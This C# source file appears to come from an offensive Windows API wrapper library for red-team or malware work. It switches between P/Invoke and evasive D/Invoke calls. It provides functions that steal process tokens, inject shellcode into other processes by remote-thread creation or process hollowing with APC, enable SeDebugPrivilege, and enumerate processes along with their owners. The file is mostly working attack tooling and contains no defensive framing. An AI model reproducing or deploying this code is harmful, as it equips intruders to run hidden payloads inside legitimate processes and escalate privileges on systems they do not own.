using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using WinAPI.Data.AdvApi;
using WinAPI.Data.Native;
using WinAPI.Data.Kernel32;
using WinAPI.Wrapper;

namespace WinAPI
{
    public class APIWrapperConfig
    {
        public APIAccessType PreferedAccessType { get; set; } = APIAccessType.DInvoke;
        public InjectionMethod PreferedInjectionMethod { get; set; } = InjectionMethod.CreateRemoteThread;
    }

    public class APIWrapper
    {
        public static APIWrapperConfig Config { get; private set; } = new APIWrapperConfig();

        public static IntPtr StealToken(int processId)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.StealToken(processId);
            else
                return DInvoke.Wrapper.StealToken(processId);
        }

        public static ProcessCreationResult CreateProcess(ProcessCreationParameters parms)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.CreateProcess(parms);
            else
                return DInvoke.Wrapper.CreateProcess(parms);
        }

        public static IntPtr OpenProcess(int processId, ProcessAccessFlags desiredAccess)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.OpenProcess((uint)processId, desiredAccess);
            else
                return DInvoke.Wrapper.OpenProcess((uint)processId, desiredAccess);
        }

        public static string ReadPipeToEnd(IntPtr pipeHandle, Action<string> callback = null, uint buffSize = 1024)
        {
            string output = string.Empty;
            string chunck = string.Empty;
            //var process = System.Diagnostics.Process.GetProcessById(processId);
            //if (process == null)
            //    return output;


            byte[] b = null;
            /*while (!process.HasExited)
            {
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    b = PInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);
                else
                    b = DInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);

                if (b != null)
                {
                    chunck = Encoding.UTF8.GetString(b);
                    output += chunck;
                    callback?.Invoke(chunck);
                }
                Thread.Sleep(100);
            }

           
            if (b != null)
            {
                chunck = Encoding.UTF8.GetString(b);
                output += chunck;
                callback?.Invoke(chunck);
            }*/

            //while (!process.HasExited)
            while (true)
            {
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    b = PInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize);
                else
                    b = DInvoke.Wrapper.ReadFromPipe(pipeHandle, buffSize); ;
                if (b != null)
                {
                    chunck = Encoding.UTF8.GetString(b);
                    output += chunck;
                    callback?.Invoke(chunck);
                }
                else
                    break;
                Thread.Sleep(50);
            }

            return output;
        }

        public static void Inject(IntPtr processHandle, IntPtr threadHandle, byte[] shellcode, uint entrypointOffset = 0, InjectionMethod? injectMethod = null)
        {
            if (injectMethod == null)
                injectMethod = Config.PreferedInjectionMethod;
            switch (injectMethod)
            {
                case InjectionMethod.CreateRemoteThread:
                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                        PInvoke.Wrapper.InjectCreateRemoteThread(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    else
                        DInvoke.Wrapper.InjectCreateRemoteThread(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    return;
                case InjectionMethod.ProcessHollowingWithAPC:
                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                        PInvoke.Wrapper.InjectProcessHollowingWithAPC(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    else
                        DInvoke.Wrapper.InjectProcessHollowingWithAPC(processHandle, threadHandle, shellcode, (int)entrypointOffset);
                    return;
            }
        }

        public static void KillProcess(int pid)
        {
            try
            {
                using (var process = Process.GetProcessById(pid))
                {
                    if (process == null)
                        return;

                    if (!process.HasExited)
                        process.Kill();
                }
            }
            catch { }
        }

        public static bool CloseHandle(IntPtr handle)
        {
            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                return PInvoke.Wrapper.CloseHandle(handle);
            else
                return DInvoke.Wrapper.CloseHandle(handle);
        }

        public static void EnableDebugPrivilege()
        {
            var hToken = IntPtr.Zero;
            try
            {
                bool success = false;
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    success = PInvoke.Advapi.OpenProcessToken(Process.GetCurrentProcess().Handle, DesiredAccess.TOKEN_ADJUST_PRIVILEGES | DesiredAccess.TOKEN_QUERY, out hToken);
                else
                    success = DInvoke.Advapi.OpenProcessToken(Process.GetCurrentProcess().Handle, DesiredAccess.TOKEN_ADJUST_PRIVILEGES | DesiredAccess.TOKEN_QUERY, out hToken);

                if (!success) return;

                var luid = new LUID();
                success = false;
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    success = PInvoke.Advapi.LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                else
                    success = DInvoke.Advapi.LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);

                if (!success) return;

                var tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES[1]
                };
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED

                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    PInvoke.Advapi.AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                else
                    DInvoke.Advapi.AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            catch { }
            finally
            {
                if (hToken != IntPtr.Zero)
                    CloseHandle(hToken);
            }
        }


        public static List<ProcessInfo> GetProcessList(string filter = null)
        {
            List<ProcessInfo> processList = new List<ProcessInfo>();
            int status;
            int returnLength = 0;
            IntPtr infoPtr = IntPtr.Zero;

            int size = 1024 * 1024;

            do
            {
                infoPtr = Marshal.AllocHGlobal(size);

                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    status = PInvoke.Native.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemProcessInformation, infoPtr, size, out returnLength);
                else
                    status = DInvoke.Native.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemProcessInformation, infoPtr, size, out returnLength);

                if (status == unchecked((int)0xC0000004)) // STATUS_INFO_LENGTH_MISMATCH
                {
                    Marshal.FreeHGlobal(infoPtr);
                    size = returnLength + (1024 * 1024);
                }
                else if (status != 0)
                {
                    Marshal.FreeHGlobal(infoPtr);
                    return processList;
                }

            } while (status == unchecked((int)0xC0000004));

            if (status == 0)
            {
                try
                {
                    long totalOffset = 0;
                    while (true)
                    {
                        IntPtr currentPtr = (IntPtr)((long)infoPtr + totalOffset);
                        SYSTEM_PROCESS_INFORMATION pi = (SYSTEM_PROCESS_INFORMATION)Marshal.PtrToStructure(currentPtr, typeof(SYSTEM_PROCESS_INFORMATION));

                        string processName = "Unknown";
                        if (pi.ImageName.Buffer != IntPtr.Zero && pi.ImageName.Length > 0)
                        {
                            try
                            {
                                processName = Marshal.PtrToStringUni(pi.ImageName.Buffer, pi.ImageName.Length / 2);
                            }
                            catch { }
                        }

                        bool match = true;
                        if (!string.IsNullOrEmpty(filter))
                        {
                            if (processName.IndexOf(filter, StringComparison.OrdinalIgnoreCase) < 0)
                            {
                                match = false;
                            }
                        }

                        if (match)
                        {
                            var pInfo = new ProcessInfo
                            {
                                ProcessId = pi.UniqueProcessId,
                                ParentId = pi.InheritedFromUniqueProcessId,
                                ProcessName = processName,
                                SessionId = (int)pi.SessionId
                            };

                            // Retrieve additional info
                            if (pInfo.ProcessId != IntPtr.Zero)
                            {
                                IntPtr hProcess = IntPtr.Zero;
                                ProcessAccessFlags access = ProcessAccessFlags.PROCESS_QUERY_INFORMATION | ProcessAccessFlags.PROCESS_VM_READ;

                                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                                    hProcess = PInvoke.Kernel32.OpenProcess(access, false, (int)pInfo.ProcessId);
                                else
                                    hProcess = DInvoke.Native.NtOpenProcess((uint)pInfo.ProcessId, access);

                                if (hProcess != IntPtr.Zero)
                                {
                                    pInfo.ImagePath = GetProcessImagePath(hProcess);
                                    pInfo.Architecture = GetProcessArchitecture(hProcess);
                                    pInfo.Owner = GetProcessOwner(hProcess);

                                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                                        PInvoke.Kernel32.CloseHandle(hProcess);
                                    else
                                        DInvoke.Kernel32.CloseHandle(hProcess);
                                }
                            }

                            processList.Add(pInfo);
                        }

                        if (pi.NextEntryOffset == 0)
                            break;

                        totalOffset += pi.NextEntryOffset;
                    }
                }
                catch { }
                finally
                {
                    Marshal.FreeHGlobal(infoPtr);
                }
            }

            return processList;
        }

        private static string GetProcessImagePath(IntPtr hProcess)
        {
            StringBuilder sb = new StringBuilder(1024);
            int size = sb.Capacity;
            bool success = false;

            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                success = PInvoke.Kernel32.QueryFullProcessImageName(hProcess, 0, sb, ref size);
            else
                success = DInvoke.Kernel32.QueryFullProcessImageName(hProcess, 0, sb, ref size);

            if (success)
                return sb.ToString();

            return null;
        }

        private static string GetProcessArchitecture(IntPtr hProcess)
        {
            bool isWow64 = false;
            bool success = false;

            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                success = PInvoke.Kernel32.IsWow64Process(hProcess, out isWow64);
            else
                success = DInvoke.Kernel32.IsWow64Process(hProcess, out isWow64);

            if (success)
            {
                // If isWow64 is true, it's a 32-bit process on 64-bit OS.
                // If isWow64 is false, it's either 64-bit on 64-bit OS, or 32-bit on 32-bit OS.
                // Assuming 64-bit OS for this context (OffensiveWinAPI usually implies modern Windows)
                // But specifically: 
                // x86 OS -> IsWow64Process returns false -> x86
                // x64 OS -> IsWow64Process returns true -> x86
                // x64 OS -> IsWow64Process returns false -> x64
                if (isWow64) return "x86";
                return (IntPtr.Size == 8) ? "x64" : "x86";
            }
            return "Unknown";
        }

        private static string GetProcessOwner(IntPtr hProcess)
        {
            IntPtr hToken = IntPtr.Zero;
            bool openToken = false;

            if (Config.PreferedAccessType == APIAccessType.PInvoke)
                openToken = PInvoke.Advapi.OpenProcessToken(hProcess, DesiredAccess.TOKEN_QUERY, out hToken);
            else
                openToken = DInvoke.Advapi.OpenProcessToken(hProcess, DesiredAccess.TOKEN_QUERY, out hToken);

            if (!openToken)
                return null;

            string owner = null;
            IntPtr tokenInfo = IntPtr.Zero;
            try
            {
                int tokenInfoLength = 0;
                bool res = false;

                // Get required size
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    PInvoke.Advapi.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);
                else
                    DInvoke.Advapi.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);

                if (tokenInfoLength > 0)
                {
                    tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);
                    if (Config.PreferedAccessType == APIAccessType.PInvoke)
                        res = PInvoke.Advapi.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength);
                    else
                        res = DInvoke.Advapi.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength);

                    if (res)
                    {
                        TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_USER));
                        StringBuilder name = new StringBuilder(256);
                        int cchName = name.Capacity;
                        StringBuilder domain = new StringBuilder(256);
                        int cchDomain = domain.Capacity;
                        int peUse;

                        bool loopupRes = false;
                        if (Config.PreferedAccessType == APIAccessType.PInvoke)
                            loopupRes = PInvoke.Advapi.LookupAccountSid(null, tu.User.Sid, name, ref cchName, domain, ref cchDomain, out peUse);
                        else
                            loopupRes = DInvoke.Advapi.LookupAccountSid(null, tu.User.Sid, name, ref cchName, domain, ref cchDomain, out peUse);

                        if (loopupRes)
                        {
                            owner = $"{domain}\\{name}";
                        }
                    }
                }
            }
            catch { }
            finally
            {
                if (tokenInfo != IntPtr.Zero) Marshal.FreeHGlobal(tokenInfo);
                if (Config.PreferedAccessType == APIAccessType.PInvoke)
                    PInvoke.Kernel32.CloseHandle(hToken);
                else
                    DInvoke.Kernel32.CloseHandle(hToken);
            }
            return owner;
        }

    }
}
